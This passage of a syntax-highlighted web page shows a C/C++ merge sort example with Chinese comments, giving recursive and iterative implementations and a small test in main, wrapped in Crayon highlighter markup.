style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include &lt;stdio.h&gt;\r\n#include &lt;limits.h&gt;\r\n\r\n// 分类 -------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- O(nlogn)\r\n// 最优时间复杂度 ---- O(nlogn)\r\n// 平均时间复杂度 ---- O(nlogn)\r\n// 所需辅助空间 ------ O(n)\r\n// 稳定性 ------------ 稳定\r\n\r\n\r\nvoid Merge(int A[], int left, int mid, int right)// 合并两个已排好序的数组A[left...mid]和A[mid+1...right]\r\n{\r\n    int len = right - left + 1;\r\n    int *temp = new int[len];       // 辅助空间O(n)\r\n    int index = 0;\r\n    int i = left;                   // 前一数组的起始元素\r\n    int j = mid + 1;                // 后一数组的起始元素\r\n    while (i &lt;= mid &amp;&amp; j &lt;= right)\r\n    {\r\n        temp[index++] = A[i] &lt;= A[j] ? A[i++] : A[j++];  // 带等号保证归并排序的稳定性\r\n    }\r\n    while (i &lt;= mid)\r\n    {\r\n        temp[index++] = A[i++];\r\n    }\r\n    while (j &lt;= right)\r\n    {\r\n        temp[index++] = A[j++];\r\n    }\r\n    for (int k = 0; k &lt; len; k++)\r\n    {\r\n        A[left++] = temp[k];\r\n    }\r\n}\r\n\r\nvoid MergeSortRecursion(int A[], int left, int right)    // 递归实现的归并排序(自顶向下)\r\n{\r\n    if (left == right)    // 当待排序的序列长度为1时，递归开始回溯，进行merge操作\r\n        return;\r\n    int mid = (left + right) / 2;\r\n    MergeSortRecursion(A, left, mid);\r\n    MergeSortRecursion(A, mid + 1, right);\r\n    Merge(A, left, mid, right);\r\n}\r\n\r\nvoid MergeSortIteration(int A[], int len)    // 非递归(迭代)实现的归并排序(自底向上)\r\n{\r\n    int left, mid, right;// 子数组索引,前一个为A[left...mid]，后一个子数组为A[mid+1...right]\r\n    for (int i = 1; i &lt; len; i *= 2)        // 子数组的大小i初始为1，每轮翻倍\r\n    {\r\n        left = 0;\r\n        while (left + i &lt; len)              // 后一个子数组存在(需要归并)\r\n        {\r\n            mid = left + i - 1;\r\n            right = mid + i &lt; len ? mid + i : len - 1;// 后一个子数组大小可能不够\r\n            Merge(A, left, mid, right);\r\n            left = right + 1;               // 前一个子数组索引向后移动\r\n        }\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A1[] = { 6, 5, 3, 1, 8, 7, 2, 4 };      // 从小到大归并排序\r\n    int A2[] = { 6, 5, 3, 1, 8, 7, 2, 4 };\r\n    int n1 = sizeof(A1) / sizeof(int);\r\n    int n2 = sizeof(A2) / sizeof(int);\r\n    MergeSortRecursion(A1, 0, n1 - 1);          // 递归实现\r\n    MergeSortIteration(A2, n2);                 // 非递归实现\r\n    printf(\"递归实现的归并排序结果：\");\r\n    for (int i = 0; i &lt; n1; i++)\r\n    {\r\n        printf(\"%d \", A1[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    printf(\"非递归实现的归并排序结果：\");\r\n    for (int i = 0; i &lt; n2; i++)\r\n    {\r\n        printf(\"%d \", A2[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-74\">74</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-75\">75</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-76\">76</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-77\">77</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-78\">78</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-79\">79</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-80\">80</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-81\">81</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-82\">82</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-83\">83</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b84396513457-84\">84</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b84396513457-85\">85</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-1\"><span class=\"crayon-p\">#include &lt;stdio.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-2\"><span class=\"crayon-p\">#include &lt;limits.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-4\"><span class=\"crayon-c\">// 分类 -------------- 内部比较排序</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-5\"><span class=\"crayon-c\">// 数据结构 ---------- 数组</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-6\"><span class=\"crayon-c\">// 最差时间复杂度 ---- O(nlogn)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-7\"><span class=\"crayon-c\">// 最优时间复杂度 ---- O(nlogn)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-8\"><span class=\"crayon-c\">// 平均时间复杂度 ---- O(nlogn)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-9\"><span class=\"crayon-c\">// 所需辅助空间 ------ O(n)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-10\"><span class=\"crayon-c\">// 稳定性 ------------ 稳定</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-12\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-13\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Merge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-c\">// 合并两个已排好序的数组A[left...mid]和A[mid+1...right]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-14\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">temp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">       </span><span class=\"crayon-c\">// 辅助空间O(n)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                   </span><span class=\"crayon-c\">// 前一数组的起始元素</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                </span><span class=\"crayon-c\">// 后一数组的起始元素</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">index</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span><span class=\"crayon-c\">// 带等号保证归并排序的稳定性</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">index</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-27\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-30\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">index</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-33\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-34\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">left</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-35\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-36\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-37\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-38\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MergeSortRecursion</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 递归实现的归并排序(自顶向下)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-39\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-40\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 当待排序的序列长度为1时，递归开始回溯，进行merge操作</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-41\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-42\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-43\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">MergeSortRecursion</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-44\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">MergeSortRecursion</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-45\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">Merge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-46\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-47\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-48\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MergeSortIteration</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 非递归(迭代)实现的归并排序(自底向上)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-49\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-50\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span 